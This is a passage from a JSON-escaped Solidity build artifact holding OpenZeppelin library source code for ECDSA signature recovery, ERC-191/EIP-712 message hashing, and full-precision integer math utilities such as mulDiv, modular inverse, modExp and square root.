unique signature with an s-value in the lower half order.\\n        //\\n        // If your library generates malleable signatures, such as s-values in the upper range, calculate a new s-value\\n        // with 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1 and flip v from 27 to 28 or\\n        // vice versa. If your library also generates signatures with 0/1 for v instead 27/28, add 27 to v to accept\\n        // these malleable signatures as well.\\n        if (uint256(s) > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) {\\n            return (address(0), RecoverError.InvalidSignatureS, s);\\n        }\\n\\n        // If the signature is valid (and not malleable), return the signer address\\n        address signer = ecrecover(hash, v, r, s);\\n        if (signer == address(0)) {\\n            return (address(0), RecoverError.InvalidSignature, bytes32(0));\\n        }\\n\\n        return (signer, RecoverError.NoError, bytes32(0));\\n    }\\n\\n    /**\\n     * @dev Overload of {ECDSA-recover} that receives the `v`,\\n     * `r` and `s` signature fields separately.\\n     */\\n    function recover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal pure returns (address) {\\n        (address recovered, RecoverError error, bytes32 errorArg) = tryRecover(hash, v, r, s);\\n        _throwError(error, errorArg);\\n        return recovered;\\n    }\\n\\n    /**\\n     * @dev Optionally reverts with the corresponding custom error according to the `error` argument provided.\\n     */\\n    function _throwError(RecoverError error, bytes32 errorArg) private pure {\\n        if (error == RecoverError.NoError) {\\n            return; // no error: do nothing\\n        } else if (error == RecoverError.InvalidSignature) {\\n            revert ECDSAInvalidSignature();\\n        } else if (error == RecoverError.InvalidSignatureLength) {\\n            revert ECDSAInvalidSignatureLength(uint256(errorArg));\\n        } else if (error == RecoverError.InvalidSignatureS) {\\n            revert ECDSAInvalidSignatureS(errorArg);\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0x69f54c02b7d81d505910ec198c11ed4c6a728418a868b906b4a0cf29946fda84\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.3.0) (utils/cryptography/MessageHashUtils.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Strings} from \\\"../Strings.sol\\\";\\n\\n/**\\n * @dev Signature message hash utilities for producing digests to be consumed by {ECDSA} recovery or signing.\\n *\\n * The library provides methods for generating a hash of a message that conforms to the\\n * https://eips.ethereum.org/EIPS/eip-191[ERC-191] and https://eips.ethereum.org/EIPS/eip-712[EIP 712]\\n * specifications.\\n */\\nlibrary MessageHashUtils {\\n    /**\\n     * @dev Returns the keccak256 digest of an ERC-191 signed data with version\\n     * `0x45` (`personal_sign` messages).\\n     *\\n     * The digest is calculated by prefixing a bytes32 `messageHash` with\\n     * `\\\"\\\\x19Ethereum Signed Message:\\\\n32\\\"` and hashing the result. It corresponds with the\\n     * hash signed when using the https://ethereum.org/en/developers/docs/apis/json-rpc/#eth_sign[`eth_sign`] JSON-RPC method.\\n     *\\n     * NOTE: The `messageHash` parameter is intended to be the result of hashing a raw message with\\n     * keccak256, although any bytes32 value can be safely used because the final digest will\\n     * be re-hashed.\\n     *\\n     * See {ECDSA-recover}.\\n     */\\n    function toEthSignedMessageHash(bytes32 messageHash) internal pure returns (bytes32 digest) {\\n        assembly (\\\"memory-safe\\\") {\\n            mstore(0x00, \\\"\\\\x19Ethereum Signed Message:\\\\n32\\\") // 32 is the bytes-length of messageHash\\n            mstore(0x1c, messageHash) // 0x1c (28) is the length of the prefix\\n            digest := keccak256(0x00, 0x3c) // 0x3c is the length of the prefix (0x1c) + messageHash (0x20)\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the keccak256 digest of an ERC-191 signed data with version\\n     * `0x45` (`personal_sign` messages).\\n     *\\n     * The digest is calculated by prefixing an arbitrary `message` with\\n     * `\\\"\\\\x19Ethereum Signed Message:\\\\n\\\" + len(message)` and hashing the result. It corresponds with the\\n     * hash signed when using the https://ethereum.org/en/developers/docs/apis/json-rpc/#eth_sign[`eth_sign`] JSON-RPC method.\\n     *\\n     * See {ECDSA-recover}.\\n     */\\n    function toEthSignedMessageHash(bytes memory message) internal pure returns (bytes32) {\\n        return\\n            keccak256(bytes.concat(\\\"\\\\x19Ethereum Signed Message:\\\\n\\\", bytes(Strings.toString(message.length)), message));\\n    }\\n\\n    /**\\n     * @dev Returns the keccak256 digest of an ERC-191 signed data with version\\n     * `0x00` (data with intended validator).\\n     *\\n     * The digest is calculated by prefixing an arbitrary `data` with `\\\"\\\\x19\\\\x00\\\"` and the intended\\n     * `validator` address. Then hashing the result.\\n     *\\n     * See {ECDSA-recover}.\\n     */\\n    function toDataWithIntendedValidatorHash(address validator, bytes memory data) internal pure returns (bytes32) {\\n        return keccak256(abi.encodePacked(hex\\\"19_00\\\", validator, data));\\n    }\\n\\n    /**\\n     * @dev Variant of {toDataWithIntendedValidatorHash-address-bytes} optimized for cases where `data` is a bytes32.\\n     */\\n    function toDataWithIntendedValidatorHash(\\n        address validator,\\n        bytes32 messageHash\\n    ) internal pure returns (bytes32 digest) {\\n        assembly (\\\"memory-safe\\\") {\\n            mstore(0x00, hex\\\"19_00\\\")\\n            mstore(0x02, shl(96, validator))\\n            mstore(0x16, messageHash)\\n            digest := keccak256(0x00, 0x36)\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the keccak256 digest of an EIP-712 typed data (ERC-191 version `0x01`).\\n     *\\n     * The digest is calculated from a `domainSeparator` and a `structHash`, by prefixing them with\\n     * `\\\\x19\\\\x01` and hashing the result. It corresponds to the hash signed by the\\n     * https://eips.ethereum.org/EIPS/eip-712[`eth_signTypedData`] JSON-RPC method as part of EIP-712.\\n     *\\n     * See {ECDSA-recover}.\\n     */\\n    function toTypedDataHash(bytes32 domainSeparator, bytes32 structHash) internal pure returns (bytes32 digest) {\\n        assembly (\\\"memory-safe\\\") {\\n            let ptr := mload(0x40)\\n            mstore(ptr, hex\\\"19_01\\\")\\n            mstore(add(ptr, 0x02), domainSeparator)\\n            mstore(add(ptr, 0x22), structHash)\\n            digest := keccak256(ptr, 0x42)\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0x26670fef37d4adf55570ba78815eec5f31cb017e708f61886add4fc4da665631\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/math/Math.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.3.0) (utils/math/Math.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Panic} from \\\"../Panic.sol\\\";\\nimport {SafeCast} from \\\"./SafeCast.sol\\\";\\n\\n/**\\n * @dev Standard math utilities missing in the Solidity language.\\n */\\nlibrary Math {\\n    enum Rounding {\\n        Floor, // Toward negative infinity\\n        Ceil, // Toward positive infinity\\n        Trunc, // Toward zero\\n        Expand // Away from zero\\n    }\\n\\n    /**\\n     * @dev Return the 512-bit addition of two uint256.\\n     *\\n     * The result is stored in two 256 variables such that sum = high * 2\\u00b2\\u2075\\u2076 + low.\\n     */\\n    function add512(uint256 a, uint256 b) internal pure returns (uint256 high, uint256 low) {\\n        assembly (\\\"memory-safe\\\") {\\n            low := add(a, b)\\n            high := lt(low, a)\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the 512-bit multiplication of two uint256.\\n     *\\n     * The result is stored in two 256 variables such that product = high * 2\\u00b2\\u2075\\u2076 + low.\\n     */\\n    function mul512(uint256 a, uint256 b) internal pure returns (uint256 high, uint256 low) {\\n        // 512-bit multiply [high low] = x * y. Compute the product mod 2\\u00b2\\u2075\\u2076 and mod 2\\u00b2\\u2075\\u2076 - 1, then use\\n        // the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256\\n        // variables such that product = high * 2\\u00b2\\u2075\\u2076 + low.\\n        assembly (\\\"memory-safe\\\") {\\n            let mm := mulmod(a, b, not(0))\\n            low := mul(a, b)\\n            high := sub(sub(mm, low), lt(mm, low))\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the addition of two unsigned integers, with a success flag (no overflow).\\n     */\\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\\n        unchecked {\\n            uint256 c = a + b;\\n            success = c >= a;\\n            result = c * SafeCast.toUint(success);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the subtraction of two unsigned integers, with a success flag (no overflow).\\n     */\\n    function trySub(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\\n        unchecked {\\n            uint256 c = a - b;\\n            success = c <= a;\\n            result = c * SafeCast.toUint(success);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the multiplication of two unsigned integers, with a success flag (no overflow).\\n     */\\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\\n        unchecked {\\n            uint256 c = a * b;\\n            assembly (\\\"memory-safe\\\") {\\n                // Only true when the multiplication doesn't overflow\\n                // (c / a == b) || (a == 0)\\n                success := or(eq(div(c, a), b), iszero(a))\\n            }\\n            // equivalent to: success ? c : 0\\n            result = c * SafeCast.toUint(success);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the division of two unsigned integers, with a success flag (no division by zero).\\n     */\\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\\n        unchecked {\\n            success = b > 0;\\n            assembly (\\\"memory-safe\\\") {\\n                // The `DIV` opcode returns zero when the denominator is 0.\\n                result := div(a, b)\\n            }\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the remainder of dividing two unsigned integers, with a success flag (no division by zero).\\n     */\\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\\n        unchecked {\\n            success = b > 0;\\n            assembly (\\\"memory-safe\\\") {\\n                // The `MOD` opcode returns zero when the denominator is 0.\\n                result := mod(a, b)\\n            }\\n        }\\n    }\\n\\n    /**\\n     * @dev Unsigned saturating addition, bounds to `2\\u00b2\\u2075\\u2076 - 1` instead of overflowing.\\n     */\\n    function saturatingAdd(uint256 a, uint256 b) internal pure returns (uint256) {\\n        (bool success, uint256 result) = tryAdd(a, b);\\n        return ternary(success, result, type(uint256).max);\\n    }\\n\\n    /**\\n     * @dev Unsigned saturating subtraction, bounds to zero instead of overflowing.\\n     */\\n    function saturatingSub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        (, uint256 result) = trySub(a, b);\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Unsigned saturating multiplication, bounds to `2\\u00b2\\u2075\\u2076 - 1` instead of overflowing.\\n     */\\n    function saturatingMul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        (bool success, uint256 result) = tryMul(a, b);\\n        return ternary(success, result, type(uint256).max);\\n    }\\n\\n    /**\\n     * @dev Branchless ternary evaluation for `a ? b : c`. Gas costs are constant.\\n     *\\n     * IMPORTANT: This function may reduce bytecode size and consume less gas when used standalone.\\n     * However, the compiler may optimize Solidity ternary operations (i.e. `a ? b : c`) to only compute\\n     * one branch when needed, making this function more expensive.\\n     */\\n    function ternary(bool condition, uint256 a, uint256 b) internal pure returns (uint256) {\\n        unchecked {\\n            // branchless ternary works because:\\n            // b ^ (a ^ b) == a\\n            // b ^ 0 == b\\n            return b ^ ((a ^ b) * SafeCast.toUint(condition));\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the largest of two numbers.\\n     */\\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return ternary(a > b, a, b);\\n    }\\n\\n    /**\\n     * @dev Returns the smallest of two numbers.\\n     */\\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return ternary(a < b, a, b);\\n    }\\n\\n    /**\\n     * @dev Returns the average of two numbers. The result is rounded towards\\n     * zero.\\n     */\\n    function average(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // (a + b) / 2 can overflow.\\n        return (a & b) + (a ^ b) / 2;\\n    }\\n\\n    /**\\n     * @dev Returns the ceiling of the division of two numbers.\\n     *\\n     * This differs from standard division with `/` in that it rounds towards infinity instead\\n     * of rounding towards zero.\\n     */\\n    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (b == 0) {\\n            // Guarantee the same behavior as in a regular Solidity division.\\n            Panic.panic(Panic.DIVISION_BY_ZERO);\\n        }\\n\\n        // The following calculation ensures accurate ceiling division without overflow.\\n        // Since a is non-zero, (a - 1) / b will not overflow.\\n        // The largest possible result occurs when (a - 1) / b is type(uint256).max,\\n        // but the largest value we can obtain is type(uint256).max - 1, which happens\\n        // when a = type(uint256).max and b = 1.\\n        unchecked {\\n            return SafeCast.toUint(a > 0) * ((a - 1) / b + 1);\\n        }\\n    }\\n\\n    /**\\n     * @dev Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or\\n     * denominator == 0.\\n     *\\n     * Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv) with further edits by\\n     * Uniswap Labs also under MIT license.\\n     */\\n    function mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256 result) {\\n        unchecked {\\n            (uint256 high, uint256 low) = mul512(x, y);\\n\\n            // Handle non-overflow cases, 256 by 256 division.\\n            if (high == 0) {\\n                // Solidity will revert if denominator == 0, unlike the div opcode on its own.\\n                // The surrounding unchecked block does not change this fact.\\n                // See https://docs.soliditylang.org/en/latest/control-structures.html#checked-or-unchecked-arithmetic.\\n                return low / denominator;\\n            }\\n\\n            // Make sure the result is less than 2\\u00b2\\u2075\\u2076. Also prevents denominator == 0.\\n            if (denominator <= high) {\\n                Panic.panic(ternary(denominator == 0, Panic.DIVISION_BY_ZERO, Panic.UNDER_OVERFLOW));\\n            }\\n\\n            ///////////////////////////////////////////////\\n            // 512 by 256 division.\\n            ///////////////////////////////////////////////\\n\\n            // Make division exact by subtracting the remainder from [high low].\\n            uint256 remainder;\\n            assembly (\\\"memory-safe\\\") {\\n                // Compute remainder using mulmod.\\n                remainder := mulmod(x, y, denominator)\\n\\n                // Subtract 256 bit number from 512 bit number.\\n                high := sub(high, gt(remainder, low))\\n                low := sub(low, remainder)\\n            }\\n\\n            // Factor powers of two out of denominator and compute largest power of two divisor of denominator.\\n            // Always >= 1. See https://cs.stackexchange.com/q/138556/92363.\\n\\n            uint256 twos = denominator & (0 - denominator);\\n            assembly (\\\"memory-safe\\\") {\\n                // Divide denominator by twos.\\n                denominator := div(denominator, twos)\\n\\n                // Divide [high low] by twos.\\n                low := div(low, twos)\\n\\n                // Flip twos such that it is 2\\u00b2\\u2075\\u2076 / twos. If twos is zero, then it becomes one.\\n                twos := add(div(sub(0, twos), twos), 1)\\n            }\\n\\n            // Shift in bits from high into low.\\n            low |= high * twos;\\n\\n            // Invert denominator mod 2\\u00b2\\u2075\\u2076. Now that denominator is an odd number, it has an inverse modulo 2\\u00b2\\u2075\\u2076 such\\n            // that denominator * inv \\u2261 1 mod 2\\u00b2\\u2075\\u2076. Compute the inverse by starting with a seed that is correct for\\n            // four bits. That is, denominator * inv \\u2261 1 mod 2\\u2074.\\n            uint256 inverse = (3 * denominator) ^ 2;\\n\\n            // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also\\n            // works in modular arithmetic, doubling the correct bits in each step.\\n            inverse *= 2 - denominator * inverse; // inverse mod 2\\u2078\\n            inverse *= 2 - denominator * inverse; // inverse mod 2\\u00b9\\u2076\\n            inverse *= 2 - denominator * inverse; // inverse mod 2\\u00b3\\u00b2\\n            inverse *= 2 - denominator * inverse; // inverse mod 2\\u2076\\u2074\\n            inverse *= 2 - denominator * inverse; // inverse mod 2\\u00b9\\u00b2\\u2078\\n            inverse *= 2 - denominator * inverse; // inverse mod 2\\u00b2\\u2075\\u2076\\n\\n            // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.\\n            // This will give us the correct result modulo 2\\u00b2\\u2075\\u2076. Since the preconditions guarantee that the outcome is\\n            // less than 2\\u00b2\\u2075\\u2076, this is the final result. We don't need to compute the high bits of the result and high\\n            // is no longer required.\\n            result = low * inverse;\\n            return result;\\n        }\\n    }\\n\\n    /**\\n     * @dev Calculates x * y / denominator with full precision, following the selected rounding direction.\\n     */\\n    function mulDiv(uint256 x, uint256 y, uint256 denominator, Rounding rounding) internal pure returns (uint256) {\\n        return mulDiv(x, y, denominator) + SafeCast.toUint(unsignedRoundsUp(rounding) && mulmod(x, y, denominator) > 0);\\n    }\\n\\n    /**\\n     * @dev Calculates floor(x * y >> n) with full precision. Throws if result overflows a uint256.\\n     */\\n    function mulShr(uint256 x, uint256 y, uint8 n) internal pure returns (uint256 result) {\\n        unchecked {\\n            (uint256 high, uint256 low) = mul512(x, y);\\n            if (high >= 1 << n) {\\n                Panic.panic(Panic.UNDER_OVERFLOW);\\n            }\\n            return (high << (256 - n)) | (low >> n);\\n        }\\n    }\\n\\n    /**\\n     * @dev Calculates x * y >> n with full precision, following the selected rounding direction.\\n     */\\n    function mulShr(uint256 x, uint256 y, uint8 n, Rounding rounding) internal pure returns (uint256) {\\n        return mulShr(x, y, n) + SafeCast.toUint(unsignedRoundsUp(rounding) && mulmod(x, y, 1 << n) > 0);\\n    }\\n\\n    /**\\n     * @dev Calculate the modular multiplicative inverse of a number in Z/nZ.\\n     *\\n     * If n is a prime, then Z/nZ is a field. In that case all elements are inversible, except 0.\\n     * If n is not a prime, then Z/nZ is not a field, and some elements might not be inversible.\\n     *\\n     * If the input value is not inversible, 0 is returned.\\n     *\\n     * NOTE: If you know for sure that n is (big) a prime, it may be cheaper to use Fermat's little theorem and get the\\n     * inverse using `Math.modExp(a, n - 2, n)`. See {invModPrime}.\\n     */\\n    function invMod(uint256 a, uint256 n) internal pure returns (uint256) {\\n        unchecked {\\n            if (n == 0) return 0;\\n\\n            // The inverse modulo is calculated using the Extended Euclidean Algorithm (iterative version)\\n            // Used to compute integers x and y such that: ax + ny = gcd(a, n).\\n            // When the gcd is 1, then the inverse of a modulo n exists and it's x.\\n            // ax + ny = 1\\n            // ax = 1 + (-y)n\\n            // ax \\u2261 1 (mod n) # x is the inverse of a modulo n\\n\\n            // If the remainder is 0 the gcd is n right away.\\n            uint256 remainder = a % n;\\n            uint256 gcd = n;\\n\\n            // Therefore the initial coefficients are:\\n            // ax + ny = gcd(a, n) = n\\n            // 0a + 1n = n\\n            int256 x = 0;\\n            int256 y = 1;\\n\\n            while (remainder != 0) {\\n                uint256 quotient = gcd / remainder;\\n\\n                (gcd, remainder) = (\\n                    // The old remainder is the next gcd to try.\\n                    remainder,\\n                    // Compute the next remainder.\\n                    // Can't overflow given that (a % gcd) * (gcd // (a % gcd)) <= gcd\\n                    // where gcd is at most n (capped to type(uint256).max)\\n                    gcd - remainder * quotient\\n                );\\n\\n                (x, y) = (\\n                    // Increment the coefficient of a.\\n                    y,\\n                    // Decrement the coefficient of n.\\n                    // Can overflow, but the result is casted to uint256 so that the\\n                    // next value of y is \\\"wrapped around\\\" to a value between 0 and n - 1.\\n                    x - y * int256(quotient)\\n                );\\n            }\\n\\n            if (gcd != 1) return 0; // No inverse exists.\\n            return ternary(x < 0, n - uint256(-x), uint256(x)); // Wrap the result if it's negative.\\n        }\\n    }\\n\\n    /**\\n     * @dev Variant of {invMod}. More efficient, but only works if `p` is known to be a prime greater than `2`.\\n     *\\n     * From https://en.wikipedia.org/wiki/Fermat%27s_little_theorem[Fermat's little theorem], we know that if p is\\n     * prime, then `a**(p-1) \\u2261 1 mod p`. As a consequence, we have `a * a**(p-2) \\u2261 1 mod p`, which means that\\n     * `a**(p-2)` is the modular multiplicative inverse of a in Fp.\\n     *\\n     * NOTE: this function does NOT check that `p` is a prime greater than `2`.\\n     */\\n    function invModPrime(uint256 a, uint256 p) internal view returns (uint256) {\\n        unchecked {\\n            return Math.modExp(a, p - 2, p);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the modular exponentiation of the specified base, exponent and modulus (b ** e % m)\\n     *\\n     * Requirements:\\n     * - modulus can't be zero\\n     * - underlying staticcall to precompile must succeed\\n     *\\n     * IMPORTANT: The result is only valid if the underlying call succeeds. When using this function, make\\n     * sure the chain you're using it on supports the precompiled contract for modular exponentiation\\n     * at address 0x05 as specified in https://eips.ethereum.org/EIPS/eip-198[EIP-198]. Otherwise,\\n     * the underlying function will succeed given the lack of a revert, but the result may be incorrectly\\n     * interpreted as 0.\\n     */\\n    function modExp(uint256 b, uint256 e, uint256 m) internal view returns (uint256) {\\n        (bool success, uint256 result) = tryModExp(b, e, m);\\n        if (!success) {\\n            Panic.panic(Panic.DIVISION_BY_ZERO);\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Returns the modular exponentiation of the specified base, exponent and modulus (b ** e % m).\\n     * It includes a success flag indicating if the operation succeeded. Operation will be marked as failed if trying\\n     * to operate modulo 0 or if the underlying precompile reverted.\\n     *\\n     * IMPORTANT: The result is only valid if the success flag is true. When using this function, make sure the chain\\n     * you're using it on supports the precompiled contract for modular exponentiation at address 0x05 as specified in\\n     * https://eips.ethereum.org/EIPS/eip-198[EIP-198]. Otherwise, the underlying function will succeed given the lack\\n     * of a revert, but the result may be incorrectly interpreted as 0.\\n     */\\n    function tryModExp(uint256 b, uint256 e, uint256 m) internal view returns (bool success, uint256 result) {\\n        if (m == 0) return (false, 0);\\n        assembly (\\\"memory-safe\\\") {\\n            let ptr := mload(0x40)\\n            // | Offset    | Content    | Content (Hex)                                                      |\\n            // |-----------|------------|--------------------------------------------------------------------|\\n            // | 0x00:0x1f | size of b  | 0x0000000000000000000000000000000000000000000000000000000000000020 |\\n            // | 0x20:0x3f | size of e  | 0x0000000000000000000000000000000000000000000000000000000000000020 |\\n            // | 0x40:0x5f | size of m  | 0x0000000000000000000000000000000000000000000000000000000000000020 |\\n            // | 0x60:0x7f | value of b | 0x<.............................................................b> |\\n            // | 0x80:0x9f | value of e | 0x<.............................................................e> |\\n            // | 0xa0:0xbf | value of m | 0x<.............................................................m> |\\n            mstore(ptr, 0x20)\\n            mstore(add(ptr, 0x20), 0x20)\\n            mstore(add(ptr, 0x40), 0x20)\\n            mstore(add(ptr, 0x60), b)\\n            mstore(add(ptr, 0x80), e)\\n            mstore(add(ptr, 0xa0), m)\\n\\n            // Given the result < m, it's guaranteed to fit in 32 bytes,\\n            // so we can use the memory scratch space located at offset 0.\\n            success := staticcall(gas(), 0x05, ptr, 0xc0, 0x00, 0x20)\\n            result := mload(0x00)\\n        }\\n    }\\n\\n    /**\\n     * @dev Variant of {modExp} that supports inputs of arbitrary length.\\n     */\\n    function modExp(bytes memory b, bytes memory e, bytes memory m) internal view returns (bytes memory) {\\n        (bool success, bytes memory result) = tryModExp(b, e, m);\\n        if (!success) {\\n            Panic.panic(Panic.DIVISION_BY_ZERO);\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Variant of {tryModExp} that supports inputs of arbitrary length.\\n     */\\n    function tryModExp(\\n        bytes memory b,\\n        bytes memory e,\\n        bytes memory m\\n    ) internal view returns (bool success, bytes memory result) {\\n        if (_zeroBytes(m)) return (false, new bytes(0));\\n\\n        uint256 mLen = m.length;\\n\\n        // Encode call args in result and move the free memory pointer\\n        result = abi.encodePacked(b.length, e.length, mLen, b, e, m);\\n\\n        assembly (\\\"memory-safe\\\") {\\n            let dataPtr := add(result, 0x20)\\n            // Write result on top of args to avoid allocating extra memory.\\n            success := staticcall(gas(), 0x05, dataPtr, mload(result), dataPtr, mLen)\\n            // Overwrite the length.\\n            // result.length > returndatasize() is guaranteed because returndatasize() == m.length\\n            mstore(result, mLen)\\n            // Set the memory pointer after the returned data.\\n            mstore(0x40, add(dataPtr, mLen))\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns whether the provided byte array is zero.\\n     */\\n    function _zeroBytes(bytes memory byteArray) private pure returns (bool) {\\n        for (uint256 i = 0; i < byteArray.length; ++i) {\\n            if (byteArray[i] != 0) {\\n                return false;\\n            }\\n        }\\n        return true;\\n    }\\n\\n    /**\\n     * @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded\\n     * towards zero.\\n     *\\n     * This method is based on Newton's method for computing square roots; the algorithm is restricted to only\\n     * using integer operations.\\n     */\\n    function sqrt(uint256 a) internal pure returns (uint256) {\\n        unchecked {\\n            // Take care of easy edge cases when a == 0 or a == 1\\n            if (a <= 1) {\\n                return a;\\n            }\\n\\n            // In this function, we use Newton's method to get a root of `f(x) := x\\u00b2 - a`. It involves building a\\n            // sequence x_n that converges toward sqrt(a). For each iteration x_n, we also define the error between\\n            // the current value as `\\u03b5_n = | x_n - sqrt(a) |`.\\n            //\\n            // For our first estimation, we consider `e` the smallest power of 2 which is bigger than the square root\\n            // of the target. (i.e. `2**(e-1) \\u2264 sqrt(a) < 2**e`). We know that `e \\u2264 128` because `(2\\u00b9\\u00b2\\u2078)\\u00b2 = 2\\u00b2\\u2075\\u2076` is\\n            // bigger than any uint256.\\n            //\\n            // By noticing that\\n            // `2**(e-1) \\u2264 sqrt(a) < 2**e \\u2192 (2**(e-1))\\u00b2 \\u2264 a < (2**e)\\u00b2 \\u2192 2**(2*e-2) \\u2264 a < 2**(2*e)`\\n            // we can deduce that `e - 1` is `log2(a) / 2`. We can thus compute `x_n = 2**(e-1)` using a method similar\\n            // to the msb function.\\n            uint256 aa = a;\\n            uint256 xn = 1;\\n\\n            if (aa >= (1 << 128)) {\\n                aa >>= 128;\\n                xn <<= 64;\\n            }\\n            if (aa >= (1 << 64)) {\\n                aa >>= 64;\\n                xn <<= 32;\\n            }\\n            if (aa >= (1 << 32)) {\\n                aa >>= 32;\\n                xn <<= 16;\\n            }\\n            if (aa >= (1 << 16)) {\\n                aa >>= 16;\\n                xn <<= 8;\\n            }\\n            if (aa >= (1 << 8)) {\\n                aa >>= 8;\\n                xn <<= 4;\\n            }\\n            if (aa >= (1 << 4)) {\\n                aa >>= 4;\\n                xn <<= 2;\\n            }\\n            if (aa >= (1 << 2)) {\\n                xn <<= 1;\\n            }\\n\\n            // We now have x_n such that `x_n = 2**(e-1) \\u2264 sqrt(a) < 2**e = 2 * x_n`. This implies \\u03b5_n \\u2264 2**(e-1).\\n            //\\n            // We can refine our estimation by noticing that the middle of that interval minimizes the error.\\n            // If we move x_n to equal 2**(e-1) + 2**(e-2), then we reduce the error to \\u03b5_n \\u2264 2**(e-2).\\n            // This is going to be our x_0 (and \\u03b5_0)\\n            xn = (3 * xn) >> 1; // \\u03b5_0 := | x_0 - sqrt(a) | \\u2264 2**(e-2)\\n\\n            // From here, Newton's method give us:\\n            // x_{n+1} = (x_n + a / x_n) / 2\\n            //\\n            // One should note that:\\n            // x_{n+1}\\u00b2 - a = ((x_n + a / x_n) / 2)\\u00b2 - a\\n            //              = ((x_n\\u00b2 + a) / (2 * x_n))\\u00b2 - a\\n            //              = (x_n\\u2074 + 2 * a * x_n\\u00b2 + a\\u00b2) / (4 * x_n\\u00b2) - a\\n            //              = (x_n\\u2074 + 2 * a * x_n\\u00b2 + a\\u00b2 - 4 * a * x_n\\u00b2) / (4 * x_n\\u00b2)\\n            //              = (x_n\\u2074 - 2 * a * x_n\\u00b2 + a\\u00b2) / (4 * x_n\\u00b2)\\n            //              = (x_n\\u00b2 - a)\\u00b2 / (2 * x_n)\\u00b2\\n            //              = ((x_n\\u00b2 - a) / (2 * x_n))\\u00b2\\n            //              \\u2265 0\\n            // Which proves that for all n \\u2265 1, sqrt(a) \\u2264 x_n\\n            //\\n            // This gives us the proof of quadratic convergence of the sequence:\\n            // \\u03b5_{n+1} = | x_{n+1} - sqrt(a) |\\n            //         = | (x_n + a / x_n) / 2 - sqrt(a) |\\n            //         = | (x_n\\u00b2 + a - 2*x_n*sqrt(a)) / (2 * x_n) |\\n            //         = | (x_n - sqrt(a))\\u00b2 / (2 * x_n) |\\n            //         = | \\u03b5_n\\u00b2 / (2 * x_n) |\\n            //         = \\u03b5_n\\u00b2 / | (2 * x_n) |\\n            //\\n            // For the first iteration, we have a special case where x_0 is known:\\n            // \\u03b5_1 = \\u03b5_0\\u00b2 / | (2 * x_0) |\\n            //     \\u2264 (2**(e-2))\\u00b2 / (2 * (2**(e-1) + 2**(e-2)))\\n            //     \\u2264 2**(2*e-4) / (3 * 2**(e-1))\\n            //     \\u2264 2**(e-3) / 3\\n            //     \\u2264 2**(e-3-log2(3))\\n            //     \\u2264 2**(e-4.5)\\n            //\\n            // For the following iterations, we use the fact that, 2**(e-1) \\u2264 sqrt(a) \\u2264 x_n:\\n            // \\u03b5_{n+1} = \\u03b5_n\\u00b2 / | (2 * x_n) |\\n            //         \\u2264 (2**(e-k))\\u00b2 / (2 * 2**(e-1))\\n            //         \\u2264 2**(2*e-2*k) / 2**e\\n            //         \\u2264 2**(e-2*k)\\n            xn = (xn + a / xn) >> 1; // \\u03b5_1 := | x_1 - sqrt(a) | \\u2264 2**(e-4.5)  -- special case, see above\\n            xn = (xn + a / xn) >> 1; // \\u03b5_2 := | x_2 - sqrt(a) | \\u2264 2**(e-9)    -- general case with k = 4.5\\n            xn = (xn + a / xn) >> 1; // \\u03b5_3 := | x_3 - sqrt(a) | \\u2264 2**(e-18)   -- general case with k = 9\\n            xn = (xn + a / xn) >> 1; // \\u03b5_4 := | x_4 - sqrt(a) | \\u2264 2**(e-36)   -- general case with k = 18\\n            xn = (xn + a / xn) >> 1; // \\u03b5_5 := | x_5 - sqrt(a) | \\u2264 2**(e-72)   -- general case with k = 36\\n            xn = (xn + a / xn) >> 1; // \\u03b5_6 := | x_6 - sqrt(a) | \\u2264 2**(e-144)  -- general case with k = 72\\n\\n            // Because e \\u2264 128 (as discussed during the first estimation phase), we know have reached a precision\\n            // \\u03b5_6 \\u2264 2**(e-144) < 1. Given we're operating on integers, then we can ensure that xn is now either\\n            // sqrt(a) or sqrt(a) + 1.\\n            return xn - SafeCast.toUint(xn > a / xn);\\n        }\\n    